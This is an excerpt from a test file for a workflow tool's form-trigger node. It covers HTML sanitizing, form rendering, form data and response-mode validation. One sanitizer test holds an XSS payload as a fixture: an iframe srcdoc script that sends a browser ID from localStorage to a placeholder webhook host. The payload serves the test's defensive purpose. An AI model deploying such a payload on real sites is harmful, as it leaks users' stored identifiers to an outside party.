...
describe('FormTrigger, sanitizeHtml', () => {
	it('should remove forbidden HTML tags', () => {
		const givenHtml = [
			...
			{
				html: "<iframe srcdoc=\"<script>fetch('https://YOURDOMAIN.app.Digital Uprisers.cloud/webhook/pepe?id='+localStorage.getItem('Digital Uprisers-browserId'))</script>\"></iframe>",
				expected:
...
describe('FormTrigger, formWebhook', () => {
	...
	it('should call response render', async () => {
		...
		expect(mockRender).toHaveBeenCalledWith('form-trigger', {
			...
			formTitle: 'Test Form',
			Digital UprisersWebsiteLink:
				'https://digitaluprisers.com/?utm_source=Digital Uprisers-internal&utm_medium=form-trigger&utm_campaign=instanceId',
			testRun: true,
...
describe('FormTrigger, prepareFormData', () => {
	it('should return valid form data with given parameters', () => {
		...
		expect(result).toEqual({
			...
			formSubmittedText: 'Thank you for your submission',
			Digital UprisersWebsiteLink:
				'https://digitaluprisers.com/?utm_source=Digital Uprisers-internal&utm_medium=form-trigger&utm_campaign=test-instance',
			formFields: [
				{
					id: 'field-0',
					errorId: 'error-field-0',
	...
	it('should handle missing optional fields gracefully', () => {
		...
		expect(result).toEqual({
			...
			formDescriptionMetadata: 'This is a test form',
			formSubmittedText: 'Your response has been recorded',
			Digital UprisersWebsiteLink: 'https://digitaluprisers.com/?utm_source=Digital Uprisers-internal&utm_medium=form-trigger',
			formFields: [
				{
					id: 'field-0',
					errorId: 'error-field-0',
...
describe('prepareFormReturnItem', () => {
	...
	const formNode = mock<INode>({ type: 'Digital Uprisers-nodes-base.formTrigger' });
...
describe('validateResponseModeConfiguration', () => {
	...
	test('throws error if "Respond to Webhook" node is connected but "responseMode" is not "responseNode" in typeVersion <= 2.1', () => {
		...
		webhookFunctions.getChildNodes.mockReturnValue([
			{ type: 'Digital Uprisers-nodes-base.respondToWebhook' } as NodeTypeAndVersion,
		]);
	...
	test('throws error if "Respond to Webhook" node is connected, version >= 2.2', () => {
		...
		expect(() => validateResponseModeConfiguration(webhookFunctions)).toThrow(
			'The "Respond to Webhook" node is not supported in workflows initiated by the "Digital Uprisers Form Trigger"',
		);
	});
